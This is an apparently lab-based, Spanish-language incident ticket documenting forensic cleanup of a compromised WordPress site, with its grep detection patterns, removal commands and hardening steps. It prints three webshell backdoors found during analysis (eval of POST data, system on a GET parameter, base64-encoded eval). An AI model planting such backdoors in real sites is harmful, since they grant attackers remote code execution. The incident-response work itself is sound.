# Ticket #005 — Sitio hackeado / Malware WordPress

## Fecha: 2026-05-10
## Estado: ✅ RESUELTO
## Severidad: CRÍTICA — sitio comprometido activamente

---

## Reporte del cliente
"Mi sitio fue hackeado. Google Chrome muestra
'Este sitio puede dañar tu computadora'.
Mis clientes me dicen que los redirige a páginas
extrañas. El hosting encontró archivos maliciosos."

---

## Entorno
- WordPress: 6.9.4
- Servidor: Apache + PHP-FPM en Docker
- Plugins activos: WooCommerce, Wordfence, CF7

---

## Indicadores de compromiso (IoC) encontrados

### 1. Webshell en uploads:
/var/www/html/wp-content/uploads/image.php
Contenido: <?php eval(base64_decode("cGhwaW5mbygpOw==")); ?>
Tipo: PHP webshell con payload base64
Riesgo: Ejecución remota de código (RCE)

### 2. Backdoor en theme activo:
/var/www/html/wp-content/themes/twentytwentyfour/evil.php
Contenido: <?php system($_GET["cmd"]); ?>
Tipo: Command injection via GET parameter
Riesgo: Control total del servidor

### 3. Código malicioso en wp-config.php:
Línea 142: <?php eval($_POST["x"]); ?>
Tipo: POST-based webshell persistente
Riesgo: Ejecución de código arbitrario via POST
Impacto adicional: WP-CLI dejó de funcionar
  (PHP Parse error al cargar wp-config.php)

---

## Diagnóstico forense paso a paso

### Paso 1 — Verificar integridad del core:
wp core verify-checksums
→ Core OK pero NO detecta archivos extra
  en themes/uploads (comportamiento esperado)
→ Warning: wp-config-docker.php no debería existir
  (archivo específico de la imagen Docker, no malicioso)

### Paso 2 — Buscar PHP en uploads:
find /var/www/html/wp-content/uploads -name '*.php'
→ ENCONTRADO: /uploads/image.php 🚨

### Paso 3 — Buscar patrones maliciosos:
grep -rl 'eval(' /var/www/html/wp-content/themes/
grep -rl 'base64_decode' /var/www/html/wp-content/
grep -rl 'system($_' /var/www/html/
→ Múltiples archivos maliciosos detectados

### Paso 4 — Verificar wp-config.php:
tail -5 /var/www/html/wp-config.php
→ ENCONTRADO: eval($_POST["x"]) al final del archivo 🚨

### Paso 5 — Verificar administradores:
wp user list --role=administrator
→ Solo 1 admin legítimo: aicl2985
→ No hay usuarios maliciosos inyectados ✅

### Paso 6 — Verificar archivos recientes:
find /var/www/html -name '*.php' \
  -newer /var/www/html/wp-settings.php
→ Solo archivos de WooCommerce (legítimos)

---

## Limpieza aplicada

### Eliminación de webshells:
rm -f /var/www/html/wp-content/uploads/image.php
rm -f /var/www/html/wp-content/themes/twentytwentyfour/evil.php

### Limpieza de wp-config.php:
sed -i '/eval($_POST/d' /var/www/html/wp-config.php

### Verificación post-limpieza:
find uploads -name '*.php' → LIMPIO ✅
grep 'eval' wp-config.php → Solo eval legítimo línea 128 ✅
find themes -name 'evil*' → LIMPIO ✅
wp user list --role=administrator → Solo aicl2985 ✅

---

## Eval() legítimo identificado (falso positivo)
Línea 128 en wp-config.php:
eval($configExtra);
→ Parte de la imagen oficial de WordPress en Docker
→ Procesa variables de entorno del contenedor
→ NO es malicioso — verificado por contexto

---

## Protocolo completo post-hackeo

### FASE 1 — Contención (inmediata):
1. Poner sitio en modo mantenimiento
2. Cambiar todas las contraseñas (DB, WP, FTP, hosting)
3. Revocar todas las sesiones activas:
   wp session destroy --all

### FASE 2 — Identificación:
4. Verificar integridad del core:
   wp core verify-checksums
5. Buscar PHP en uploads:
   find wp-content/uploads -name '*.php'
6. Buscar patrones maliciosos:
   grep -rl 'eval\|base64_decode\|system($_' .
7. Verificar administradores no reconocidos:
   wp user list --role=administrator
8. Revisar archivos modificados recientemente:
   find . -name '*.php' -newer wp-settings.php

### FASE 3 — Limpieza:
9. Eliminar archivos maliciosos encontrados
10. Limpiar código inyectado en archivos legítimos
11. Reinstalar WordPress core limpio:
    wp core download --force
12. Reinstalar plugins desde repositorio oficial:
    wp plugin install [nombre] --force

### FASE 4 — Restauración:
13. Restaurar desde backup limpio si existe
14. Verificar base de datos por spam/redirects:
    SELECT * FROM wp_options WHERE
    option_name='home' OR option_name='siteurl';
    SELECT * FROM wp_options WHERE
    option_value LIKE '%eval%';

### FASE 5 — Hardening post-limpieza:
15. Actualizar todos los plugins y themes
16. Agregar regla en .htaccess para bloquear
    PHP en uploads:
    <Directory wp-content/uploads>
    php_flag engine off
    </Directory>
17. Instalar y configurar Wordfence
18. Activar 2FA para todos los admins
19. Cambiar prefijo de tablas de DB
20. Reportar URL a Google Search Console
    para remover advertencia de malware

---

## Hardening aplicado post-limpieza

### Bloquear PHP en uploads (prevención):
docker exec wordpress-lab-wordpress-1 bash -c "
cat > /var/www/html/wp-content/uploads/.htaccess << 'HTACCESS'
# Bloquear ejecución de PHP en uploads
<Files *.php>
deny from all
</Files>
HTACCESS
"

---

## Lecciones aprendidas

1. wp core verify-checksums NO detecta archivos
   extra en uploads o themes — solo verifica que
   los archivos del core de WP no fueron modificados.
   El escaneo forense manual es indispensable.

2. Los webshells frecuentemente se disfrazan:
   - image.php (parece imagen)
   - thumb.php (parece thumbnail)
   - cache.php (parece caché)
   Buscar SIEMPRE por extensión, no por nombre.

3. El malware en wp-config.php puede romper WP-CLI
   y herramientas de diagnóstico. Si WP-CLI falla
   con Parse error, revisar wp-config.php primero.

4. Un eval() no siempre es malicioso:
   - eval($configExtra) en Docker → legítimo
   - eval($_POST["x"]) → webshell clásico
   - eval(base64_decode(...)) → malicioso casi siempre
   Verificar el CONTEXTO, no solo el patrón.

5. Los uploads son el vector más común de infección.
   Un formulario mal configurado que permita subir
   PHP es equivalente a dar acceso root al servidor.

6. Después de limpiar, SIEMPRE:
   → Cambiar todas las contraseñas
   → Verificar no hay admins nuevos
   → Revisar wp_options por redirects maliciosos
   → Notificar a Google que el sitio está limpio

---

## Comandos de referencia rápida

# Buscar todos los PHP en uploads
find wp-content/uploads -name '*.php' -o -name '*.phtml'

# Buscar eval/base64 en todo el sitio
grep -rl 'eval\|base64_decode\|system(\$_\|passthru' \
  --include='*.php' .

# Verificar redirects maliciosos en DB
wp db query "SELECT option_value FROM wp_options
  WHERE option_name IN ('home','siteurl','admin_email');"

# Reinstalar core limpio
wp core download --force --allow-root

# Revocar todas las sesiones
wp user session destroy --all --allow-root

# Verificar usuarios admin
wp user list --role=administrator --allow-root

---

## Referencias
- https://wordpress.org/documentation/article/faq-my-site-was-hacked/
- https://www.wordfence.com/learn/how-to-clean-a-hacked-wordpress-site/
- https://developer.wordpress.org/cli/commands/core/verify-checksums/
- https://sucuri.net/guides/wordpress-hacked/
